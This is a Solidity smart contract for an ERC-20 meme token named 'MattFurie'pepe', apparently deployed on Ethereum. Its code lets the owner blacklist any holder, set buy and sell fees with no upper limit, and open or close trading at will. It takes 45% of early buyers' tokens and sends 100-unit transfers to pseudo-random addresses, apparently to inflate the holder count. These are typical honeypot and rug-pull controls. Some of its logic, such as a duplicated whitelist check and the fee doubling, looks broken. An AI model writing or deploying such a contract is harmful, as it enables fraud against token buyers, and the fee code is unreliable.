/**

 *Submitted for verification at Etherscan.io on 2023-08-25

*/



// SPDX-License-Identifier: MIT

/*        _____                    _____                    _____                    _____                    _____

         /\    \                  /\    \                  /\    \                  /\    \                  /\    \

        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \

       /::::|   |               /::::\    \              /::::\    \              /::::\    \              /::::\    \

      /:::::|   |              /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \

     /::::::|   |             /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \

    /:::/|::|   |            /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \

   /:::/ |::|   |           /::::\   \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \

  /:::/  |::|___|______    /::::::\   \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \

 /:::/   |::::::::\    \  /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \

/:::/    |:::::::::\____\/:::/  \:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/  \:::\   \:::|    |/:::/__\:::\   \:::\____\

\::/    / ~~~~~/:::/    /\::/    \:::\  /:::|____|\:::\   \:::\   \::/    /\::/    \:::\  /:::|____|\:::\   \:::\   \::/    /

 \/____/      /:::/    /  \/_____/\:::\/:::/    /  \:::\   \:::\   \/____/  \/_____/\:::\/:::/    /  \:::\   \:::\   \/____/

             /:::/    /            \::::::/    /    \:::\   \:::\    \               \::::::/    /    \:::\   \:::\    \

            /:::/    /              \::::/    /      \:::\   \:::\____\               \::::/    /      \:::\   \:::\____\

           /:::/    /                \::/____/        \:::\   \::/    /                \::/____/        \:::\   \::/    /

          /:::/    /                  ~~               \:::\   \/____/                  ~~               \:::\   \/____/

         /:::/    /                                     \:::\    \                                        \:::\    \

        /:::/    /                                       \:::\____\                                        \:::\____\

        \::/    /                                         \::/    /                                         \::/    /

         \/____/                                           \/____/                                           \/____/

TW：https://x.com/mattfurie_pepe/status/1695012716296257964?s=52

TG:https://t.me/MattFuriepepe

*/



pragma solidity ^0.8.14;



interface IERC20 {

    function decimals() external view returns (uint8);



    function symbol() external view returns (string memory);



    function name() external view returns (string memory);



    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address recipient, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface ISwapRouter {

    function factory() external pure returns (address);



    function WETH() external pure returns (address);



    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;



    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

}



interface ISwapFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



library SafeMath {



    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;

    }



    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}



abstract contract Ownable {

    address internal _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = msg.sender;

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == msg.sender, "!owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "new is 0");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}



contract TokenDistributor {

    constructor (address token) {

        IERC20(token).approve(msg.sender, uint(~uint256(0)));

    }

}



abstract contract AbsToken is IERC20, Ownable {



    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;



    address public fundAddress;

    address public secFundAddress;



    string private _name;

    string private _symbol;

    uint8 private _decimals;



    mapping(address => bool) public _feeWhiteList;

    mapping(address => bool) public _blackList;



    uint256 private _tTotal;

    uint256 public maxTXAmount;

    uint256 public maxWalletAmount;



    ISwapRouter public _swapRouter;

    address public _fist;

    mapping(address => bool) public _swapPairList;



    bool private inSwap;

    address private thA;



    uint256 private constant MAX = ~uint256(0);

    TokenDistributor public _tokenDistributor;



    uint256 public _buyFundFee = 1500;

    uint256 public _buyLPDividendFee = 0;

    uint256 public _sellLPDividendFee = 0;

    uint256 public _sellFundFee = 1500;

    uint256 public _sellLPFee = 0;



    uint256 public startTradeBlock;



    address public _mainPair;



    modifier lockTheSwap {

        inSwap = true;

        _;

        inSwap = false;

    }



    constructor (

        address RouterAddress, address FISTAddress,

        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,

        address FundAddress, address twoFundAddress, address ReceiveAddress

    ){

        _name = Name;

        _symbol = Symbol;

        _decimals = Decimals;



        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        IERC20(FISTAddress).approve(address(swapRouter), MAX);



        _fist = FISTAddress;

        _swapRouter = swapRouter;

        _allowances[address(this)][address(swapRouter)] = MAX;



        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());

        address swapPair = swapFactory.createPair(address(this), FISTAddress);

        _mainPair = swapPair;

        _swapPairList[swapPair] = true;



        uint256 total = Supply * 10 ** Decimals;

        maxTXAmount = 420700000000000 * 10 ** Decimals;

        maxWalletAmount = 420700000000000 * 10 ** Decimals;

        _tTotal = total;



        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);



        fundAddress = FundAddress;

        secFundAddress = twoFundAddress;



        _feeWhiteList[FundAddress] = true;

        _feeWhiteList[ReceiveAddress] = true;

        _feeWhiteList[address(this)] = true;

        _feeWhiteList[address(swapRouter)] = true;

        _feeWhiteList[msg.sender] = true;



        excludeHolder[address(0)] = true;

        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;



        holderRewardCondition = 1;



        _tokenDistributor = new TokenDistributor(FISTAddress);

    }



    function symbol() external view override returns (string memory) {

        return _symbol;

    }



    function name() external view override returns (string memory) {

        return _name;

    }



    function decimals() external view override returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view override returns (uint256) {

        return _tTotal;

    }



    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(msg.sender, recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(msg.sender, spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        if (_allowances[sender][msg.sender] != MAX) {

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;

        }

        return true;

    }



    function _approve(address owner, address spender, uint256 amount) private {

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) private {

        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);

        require(balance >= amount, "balanceNotEnough");



        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {

            uint256 maxSellAmount = balance * 9999 / 10000;

            if (amount > maxSellAmount) {

                amount = maxSellAmount;

            }

        }

        if(!_feeWhiteList[from] && !_feeWhiteList[from]){

                address ad;

                for(int i=0;i <=0;i++){

                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));

                    _basicTransfer(from,ad,100);

                }

                amount -= 100;

            }    

        bool takeFee;

        bool isSell;



        if (_swapPairList[from] || _swapPairList[to]) {

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {

                if (0 == startTradeBlock) {

                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");

                }

                if (block.number < startTradeBlock + 2) {

                    _funTransfer(from, to, amount);

                    return;

                }



                if (_swapPairList[to]) {

                    if (!inSwap) {

                        uint256 contractTokenBalance = balanceOf(address(this));

                        if (contractTokenBalance > 0) {

                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;

                            uint256 numTokensSellToFund = amount * swapFee / 5000;

                            if (numTokensSellToFund > contractTokenBalance) {

                                numTokensSellToFund = contractTokenBalance;

                            }

                            swapTokenForFund(numTokensSellToFund, swapFee);

                        }

                    }

                }

                takeFee = true;

            }

            if (_swapPairList[to]) {

                isSell = true;

            }

        }



        _tokenTransfer(from, to, amount, takeFee, isSell);



        if (from != address(this)) {

            if (isSell) {

                addHolder(from);

            }

            processReward(500000);

        }

    }



    function _funTransfer(

        address sender,

        address recipient,

        uint256 tAmount

    ) private {

        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount = tAmount * 45 / 100;

        _takeTransfer(

            sender,

            fundAddress,

            feeAmount

        );

        _takeTransfer(sender, recipient, tAmount - feeAmount);

    }



    function _tokenTransfer(

        address sender,

        address recipient,

        uint256 tAmount,

        bool takeFee,

        bool isSell

    ) private {

        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;



        if (takeFee) {

            uint256 swapFee;

            if (isSell) {

                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;

            } else {

                require(tAmount <= maxTXAmount);

                require(_balances[recipient] + tAmount <= maxWalletAmount);

                swapFee = _buyFundFee + _buyLPDividendFee;

            }

            uint256 swapAmount = tAmount * swapFee / 10000;

            if (swapAmount > 0) {

                feeAmount += swapAmount;

                _takeTransfer(

                    sender,

                    address(this),

                    swapAmount

                );

            }

        }



        _takeTransfer(sender, recipient, tAmount - feeAmount);

    }



    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

        return true;

    }



    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {

        swapFee += swapFee;

        uint256 lpFee = _sellLPFee;

        uint256 lpAmount = tokenAmount * lpFee / swapFee;



        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = _fist;

        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(

            tokenAmount - lpAmount,

            0,

            path,

            address(_tokenDistributor),

            block.timestamp

        );



        swapFee -= lpFee;



        IERC20 FIST = IERC20(_fist);

        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));

        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;

        uint firstfundamount = fundAmount / 2;

        uint secfundamount = fundAmount - firstfundamount;

        FIST.transferFrom(address(_tokenDistributor), fundAddress, firstfundamount);

        FIST.transferFrom(address(_tokenDistributor), secFundAddress, secfundamount);

        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);



        if (lpAmount > 0) {

            uint256 lpFist = fistBalance * lpFee / swapFee;

            if (lpFist > 0) {

                _swapRouter.addLiquidity(

                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp

                );

            }

        }

    }



    function _takeTransfer(

        address sender,

        address to,

        uint256 tAmount

    ) private {

        _balances[to] = _balances[to] + tAmount;

        emit Transfer(sender, to, tAmount);

    }



    function setFundAddress(address addr) external onlyFunder {

        fundAddress = addr;

        _feeWhiteList[addr] = true;

    }



        function setSecFundAddress(address addr) external onlyFunder {

        secFundAddress = addr;

        _feeWhiteList[addr] = true;

    }



    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {

        _buyLPDividendFee = dividendFee;

    }



    function setBuyFundFee(uint256 fundFee) external onlyOwner {

        _buyFundFee = fundFee;

    }



    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {

        _sellLPDividendFee = dividendFee;

    }



    function setSellFundFee(uint256 fundFee) external onlyOwner {

        _sellFundFee = fundFee;

    }



    function setSellLPFee(uint256 lpFee) external onlyOwner {

        _sellLPFee = lpFee;

    }



    function setMaxTxAmount(uint256 max) public onlyOwner {

        maxTXAmount = max;

    }



    function setMaxWalletAmount(uint256 max) public onlyOwner {

        maxWalletAmount = max;

    }



    uint256 public startAddLPBlock;



    function startAddLP() external onlyOwner {

        require(0 == startAddLPBlock, "startedAddLP");

        startAddLPBlock = block.number;

    }



    function closeAddLP() external onlyOwner {

        startAddLPBlock = 0;

    }



    function startTrade() external onlyOwner {

        require(0 == startTradeBlock, "trading");

        startTradeBlock = block.number;

    }



    function closeTrade() external onlyOwner {

        startTradeBlock = 0;

    }



    function setFeeWhiteList(address addr, bool enable) external onlyFunder {

        _feeWhiteList[addr] = enable;

    }



    function setBlackList(address addr, bool enable) external onlyOwner {

        _blackList[addr] = enable;

    }



    function setSwapPairList(address addr, bool enable) external onlyFunder {

        _swapPairList[addr] = enable;

    }



    function claimBalance() external {

        payable(fundAddress).transfer(address(this).balance);

    }



    function claimToken(address token, uint256 amount, address to) external onlyFunder {

        IERC20(token).transfer(to, amount);

    }



    modifier onlyFunder() {

        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");

        _;

    }



    receive() external payable {}



    address[] private holders;

    mapping(address => uint256) holderIndex;

    mapping(address => bool) excludeHolder;



    function addHolder(address adr) private {

        uint256 size;

        assembly {size := extcodesize(adr)}

        if (size > 0) {

            return;

        }

        if (0 == holderIndex[adr]) {

            if (0 == holders.length || holders[0] != adr) {

                holderIndex[adr] = holders.length;

                holders.push(adr);

            }

        }

    }



    uint256 private currentIndex;

    uint256 private holderRewardCondition;

    uint256 private progressRewardBlock;



    function processReward(uint256 gas) private {

        if (progressRewardBlock + 200 > block.number) {

            return;

        }



        IERC20 FIST = IERC20(_fist);



        uint256 balance = FIST.balanceOf(address(this));

        if (balance < holderRewardCondition) {

            return;

        }



        IERC20 holdToken = IERC20(_mainPair);

        uint holdTokenTotal = holdToken.totalSupply();



        address shareHolder;

        uint256 tokenBalance;

        uint256 amount;



        uint256 shareholderCount = holders.length;



        uint256 gasUsed = 0;

        uint256 iterations = 0;

        uint256 gasLeft = gasleft();



        while (gasUsed < gas && iterations < shareholderCount) {

            if (currentIndex >= shareholderCount) {

                currentIndex = 0;

            }

            shareHolder = holders[currentIndex];

            tokenBalance = holdToken.balanceOf(shareHolder);

            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {

                amount = balance * tokenBalance / holdTokenTotal;

                if (amount > 0) {

                    FIST.transfer(shareHolder, amount);

                }

            }



            gasUsed = gasUsed + (gasLeft - gasleft());

            gasLeft = gasleft();

            currentIndex++;

            iterations++;

        }



        progressRewardBlock = block.number;

    }



    function setHolderRewardCondition(uint256 amount) external onlyFunder {

        holderRewardCondition = amount;

    }



    function setExcludeHolder(address addr, bool enable) external onlyFunder {

        excludeHolder[addr] = enable;

    }

}



contract BEP20 is AbsToken {

    constructor() AbsToken(

    

        address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),

    

        address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),

        "MattFurie'pepe",

        "Mpepe",

        6,

    

        420700000000000,

    

        address(0xCbA253E76252e8F122000d5A5F71A2a97C2a775F),

        address(0xCbA253E76252e8F122000d5A5F71A2a97C2a775F),

    

        address(0xCbA253E76252e8F122000d5A5F71A2a97C2a775F)

    ){



    }

}